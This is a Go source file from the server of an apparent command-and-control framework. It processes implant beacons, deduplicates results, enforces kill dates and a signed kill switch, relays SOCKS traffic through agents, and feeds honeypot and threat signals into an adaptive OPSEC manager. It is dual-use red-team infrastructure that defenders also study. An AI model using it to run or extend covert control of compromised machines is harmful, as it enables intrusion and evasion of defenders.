package server

import (
	"context"
	"encoding/hex"
	"fmt"
	"hash/fnv"
	"log/slog"
	"strconv"
	"time"

	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/pkg/protocol"
)

// ── Core beacon pipeline: hooks, enforcement, dedup, processBeacon ─────────

// fireAgentConnectHook notifies plugins about an agent connection asynchronously.
func (s *Server) fireAgentConnectHook(agent db.Implant, isNew bool, now time.Time) {
	if isNew {
		s.queueAutoRecon(agent)
	}
	if s.pluginManager == nil {
		return
	}
	s.runTaskWorker("plugin_connect_hook", func() {
		ctx, cancel := context.WithTimeout(s.ctx, PluginHookTimeout)
		defer cancel()
		if err := s.pluginManager.ExecuteHook(ctx, plugin.Event{
			Type:      plugin.EventAgentConnect,
			Timestamp: now,
			AgentID:   agent.ID,
			Payload: map[string]interface{}{
				"hostname": agent.Hostname,
				"ip":       agent.IP,
				"os":       agent.OS,
				"username": agent.Username,
				"new":      isNew,
			},
		}); err != nil {
			slog.Warn("Hook errors on agent_connect event", "agent_id", agent.ID, "err", err)
		}
	})
}

// enforceKillDate injects a kill task when the agent's kill date has passed and no kill task
// is already pending. This ensures the agent self-destructs on its next execution cycle.
func (s *Server) enforceKillDate(agent db.Implant, resp *beaconResponse, now time.Time) {
	if agent.KillDate == nil || !now.After(*agent.KillDate) {
		return
	}
	for _, t := range resp.Tasks {
		if t.Type == "kill" {
			return
		}
	}
	killTask, err := s.createTask(agent.ID, "kill", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create kill task for expired agent", "agent_id", agent.ID, "error", err)
		return
	}
	killTask.Status = "running"
	if err := s.db.Save(killTask).Error; err != nil {
		slog.Error("Failed to save kill task", "agent_id", agent.ID, "error", err)
		return
	}
	resp.Tasks = append(resp.Tasks, task{
		ID:   killTask.ID,
		Type: killTask.Type,
	})
}

// enforceKillSwitch attaches the fleet kill-switch broadcast to the beacon
// response while it is armed. The token is regenerated on every arm and its
// per-implant authentication tag is derived from the agent's registration key,
// so only the server that holds the key can order self-destruct (and old
// broadcasts cannot be replayed after a disarm).
func (s *Server) enforceKillSwitch(agent db.Implant, resp *beaconResponse) {
	armed, token := s.killSwitchState()
	if !armed || token == "" {
		return
	}
	regKey := s.deriveRegKey(agent.ID)
	if len(regKey) == 0 {
		return
	}
	ksKey := crypto.DeriveKillSwitchKey(regKey)
	if len(ksKey) == 0 {
		return
	}
	resp.KillSwitch = token
	resp.KillSwitchMAC = hex.EncodeToString(crypto.KillSwitchHMAC(ksKey, []byte(token)))
}

// beaconFingerprint returns a dedup key for a beacon request.
// It reduces the actual payload (results, SOCKS frames, acks, relayed data)
// to a stable fingerprint so that beacons carrying different data are never
// mistaken for duplicates. FNV-1a 64-bit is used instead of SHA-256 because
// this runs on every beacon and only needs collision resistance against the
// bounded in-memory dedup cache (10k entries, 5s window), not cryptographic
// integrity.
func beaconFingerprint(req beaconRequest) string {
	h := fnv.New64a()
	h.Write([]byte(req.UUID))
	// Include the frame sequence so a legitimate retransmission with a NEW seq
	// but identical payload is not mistaken for a duplicate and silently
	// dropped (which would lose its tasks when a response was dropped).
	h.Write([]byte(strconv.FormatUint(req.Seq, 10)))
	for _, r := range req.Results {
		h.Write([]byte(r.Type))
		h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
		h.Write([]byte(r.ResultID))
		h.Write([]byte(r.MAC))
		h.Write([]byte(r.Encoding))
		h.Write([]byte(strconv.FormatBool(r.Partial)))
		h.Write([]byte(strconv.FormatBool(r.EncryptedWithTaskKey)))
		if len(r.Output) > 1024 {
			h.Write([]byte(r.Output[:1024]))
			h.Write([]byte(strconv.Itoa(len(r.Output))))
		} else {
			h.Write([]byte(r.Output))
		}
		if len(r.Error) > 1024 {
			h.Write([]byte(r.Error[:1024]))
			h.Write([]byte(strconv.Itoa(len(r.Error))))
		} else {
			h.Write([]byte(r.Error))
		}
		h.Write([]byte(r.Filename))
		h.Write([]byte(strconv.FormatInt(r.Size, 10)))
		h.Write([]byte(strconv.FormatInt(r.Offset, 10)))
		h.Write([]byte(r.Path))
	}
	for _, f := range req.SocksData {
		h.Write([]byte(strconv.FormatUint(f.ConnID, 10)))
		h.Write([]byte(f.Action))
		h.Write(f.Data)
	}
	for _, id := range req.AckTaskIDs {
		h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
	}
	for _, rel := range req.Relayed {
		h.Write([]byte(rel.AgentID))
		for _, r := range rel.Results {
			h.Write([]byte(r.Type))
			h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
			if len(r.Output) > 1024 {
				h.Write([]byte(r.Output[:1024]))
				h.Write([]byte(strconv.Itoa(len(r.Output))))
			} else {
				h.Write([]byte(r.Output))
			}
			if len(r.Error) > 1024 {
				h.Write([]byte(r.Error[:1024]))
				h.Write([]byte(strconv.Itoa(len(r.Error))))
			} else {
				h.Write([]byte(r.Error))
			}
			h.Write([]byte(r.Filename))
		}
		for _, id := range rel.AckTaskIDs {
			h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
		}
	}
	return req.UUID + ":" + hex.EncodeToString(h.Sum(nil))
}

// isDuplicateBeacon checks if this beacon was recently processed.
func (s *Server) isDuplicateBeacon(req beaconRequest) bool {
	if s.beaconDedupCache == nil {
		return false
	}
	fp := beaconFingerprint(req)
	if fp == "" {
		return false
	}
	s.beaconDedupMu.Lock()
	defer s.beaconDedupMu.Unlock()
	// Bounded cache: sweep expired entries at most once per window so a
	// flood of fresh keys cannot trigger an O(n) scan on every beacon.
	// If still over cap after the sweep (all-fresh flood), evict
	// oldest-first to hard-bound memory. Per-beacon overshoot is tiny (one
	// beacon inserts one key), so the scan stays O(cap).
	if len(s.beaconDedupCache) > MaxBeaconDedupEntries {
		now := time.Now()
		if now.Sub(s.beaconDedupSweep) >= BeaconDedupWindow {
			s.beaconDedupSweep = now
			for k, t := range s.beaconDedupCache {
				if now.Sub(t) > BeaconDedupWindow {
					delete(s.beaconDedupCache, k)
				}
			}
		}
		for len(s.beaconDedupCache) > MaxBeaconDedupEntries {
			oldestK := ""
			var oldestT time.Time
			first := true
			for k, t := range s.beaconDedupCache {
				if first || t.Before(oldestT) {
					oldestK, oldestT, first = k, t, false
				}
			}
			if first {
				break
			}
			delete(s.beaconDedupCache, oldestK)
		}
	}
	if t, ok := s.beaconDedupCache[fp]; ok {
		if time.Since(t) < BeaconDedupWindow {
			return true
		}
	}
	s.beaconDedupCache[fp] = time.Now()
	return false
}

// isDuplicateResult reports whether this task result was already applied for
// this agent. Agent results carry a per-result id; re-sends after dropped
// frames arrive with a new envelope seq, so idempotency keys on (agent, rid).
func (s *Server) isDuplicateResult(agentID string, r taskResult) bool {
	if r.ResultID == "" {
		return false
	}
	key := agentID + "/" + r.ResultID
	s.resultDedupeMu.Lock()
	defer s.resultDedupeMu.Unlock()
	if s.resultDedupeCache == nil {
		s.resultDedupeCache = make(map[string]time.Time)
	}
	if t, ok := s.resultDedupeCache[key]; ok && time.Since(t) < BeaconDedupWindow {
		return true
	}
	if len(s.resultDedupeCache) > MaxBeaconDedupEntries {
		now := time.Now()
		if now.Sub(s.resultDedupeSweep) >= BeaconDedupWindow {
			s.resultDedupeSweep = now
			for k, t := range s.resultDedupeCache {
				if now.Sub(t) > BeaconDedupWindow {
					delete(s.resultDedupeCache, k)
				}
			}
		}
		for len(s.resultDedupeCache) > MaxBeaconDedupEntries {
			oldestK := ""
			var oldestT time.Time
			first := true
			for k, t := range s.resultDedupeCache {
				if first || t.Before(oldestT) {
					oldestK, oldestT, first = k, t, false
				}
			}
			if first {
				break
			}
			delete(s.resultDedupeCache, oldestK)
		}
	}
	s.resultDedupeCache[key] = time.Now()
	return false
}

// processBeacon contains the core beacon logic (registration, result processing,
// task dispatch). It is shared between HTTP and TCP transports.
func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconResponse {
	return s.processBeaconWithBudget(req, publicIP, 0, 0)
}

// processBeaconWithBudget is processBeacon with a tunnel frame budget for
// datagram transports (frameSize/budget<=0 drains everything). Relayed
// children inherit the parent's budget: their replies nest inside the
// parent's single response datagram.
func (s *Server) processBeaconWithBudget(req beaconRequest, publicIP string, frameSize, budget int) beaconResponse {
	now := time.Now()

	// Dedup: skip recently processed identical beacons
	if s.isDuplicateBeacon(req) {
		slog.Warn("Duplicate beacon dropped", "agent_id", req.UUID)
		return beaconResponse{}
	}

	// Reject malformed agent IDs before any DB or filesystem use
	if !isValidAgentID(req.UUID) {
		slog.Warn("Beacon rejected: invalid agent ID", "agent_id", req.UUID)
		return beaconResponse{}
	}

	// Protocol negotiation: the server speaks the current version and, inside
	// the compatibility window, the compatible older ones. A refusal is
	// explained, counted and audited instead of silently dropping the
	// beacon, so an agent that cannot check in shows up as "protocol
	// mismatch" rather than "offline".
	decision := s.negotiateProtocol(req.UUID, req.ProtocolVersion)
	if !decision.Serve {
		return beaconResponse{
			ProtocolRejected:        true,
			ProtocolRejectionReason: protocolRejectionMessage(decision),
		}
	}

	agent, _ := s.processAgentRegistration(req, publicIP, now)
	if agent.ID == "" {
		return beaconResponse{}
	}

	// Wire agent environment threat score to adaptive OPSEC manager
	if s.opsecAdaptive != nil && agent.EnvThreatScore > 0 {
		for i := 0; i < agent.EnvThreatScore/20; i++ {
			s.opsecAdaptive.RecordIntegrityFailure(agent.ID)
		}
		if agent.EnvHoneypot {
			slog.Warn("Agent reports honeypot environment", "agent_id", agent.ID, "threat_score", agent.EnvThreatScore)
			s.opsecAdaptive.RecordIntegrityFailure(agent.ID)
		}
	}

	// NOTE: the plugin connect hook fires inside processAgentRegistration
	// (new + reconnect only) — not per beacon.

	s.processTaskAcknowledgements(req.UUID, req.AckTaskIDs, now)
	s.processTaskResults(agent, req.Results, req.UUID, now)

	// Agent-side result drops (queue-full evictions, oversized singles) are
	// reported here so gaps are operator-visible instead of silent: warn log
	// plus an audit record the timeline view can show.
	if req.DroppedResults > 0 {
		slog.Warn("Agent dropped task results before sending", "agent_id", req.UUID, "dropped", req.DroppedResults)
		if s.metrics != nil {
			s.metrics.AgentResultGapsTotal.Add(float64(req.DroppedResults))
		}
		s.LogAuditRecord(nil, "agent_result_gap", "agent", req.UUID,
			fmt.Sprintf("agent discarded %d result(s) before delivery (queue-full/oversized)", req.DroppedResults), true, nil)
	}

	// Server-side traffic auto-adapt loop: queues a real set_sleep task when
	// the observed beacon timing deviates from the agent's stored sleep config.
	s.maybeAutoAdaptBeacon(agent)

	if len(req.Relayed) > 0 {
		s.processRelayedResults(req.Relayed, req.UUID, now)
	}

	relayedReplies := s.processRelayedEnvelopes(req.RelayedFrames, req.UUID, publicIP, now, 0, frameSize, budget)

	taskLimit := BeaconTaskFetchLimit
	if req.TaskCapacity != nil && *req.TaskCapacity >= 0 && *req.TaskCapacity < taskLimit {
		taskLimit = *req.TaskCapacity
	}
	if taskLimit == 0 {
		// A zero-capacity agent with backlog starves delivery until the cap
		// 429s new work: debug-level so the stall is diagnosable without
		// spamming the log on every healthy empty-queue beacon.
		s.agentPendingTasksMu.Lock()
		backlog := s.agentPendingTasks[req.UUID]
		s.agentPendingTasksMu.Unlock()
		if backlog > 0 {
			slog.Debug("Agent reports zero task capacity with backlog", "agent_id", req.UUID, "backlog", backlog)
		}
	}
	resp := beaconResponse{
		Tasks:              s.fetchPendingTasks(req.UUID, taskLimit),
		TenantID:           agent.TenantID,
		TenantResolved:     true,
		Relayed:            s.fetchRelayedChildTasks(req.UUID),
		RelayedReplies:     relayedReplies,
		ProtocolVersion:    protocol.CurrentProtocolVersion,
		ProtocolDeprecated: decision.Level == protocol.SupportDeprecated,
		LastSeq:            s.currentLastSeq(req.UUID),
	}

	// Online config refresh: deliver the operator's live network config when it
	// changed (or the periodic refresh is due) so a long-running beacon picks
	// up rotated endpoints/sleep/malleable settings without re-registering.
	// Datagram transports (frameSize > 0) only get it when it fits one frame.
	resp.NetworkConfig = s.networkConfigForBeacon(agent, now, frameSize)

	s.enforceKillDate(agent, &resp, now)
	s.enforceKillSwitch(agent, &resp)
	s.processSOCKSRelayWithBudget(req.UUID, req.SocksData, &resp, frameSize, budget)

	return resp
}
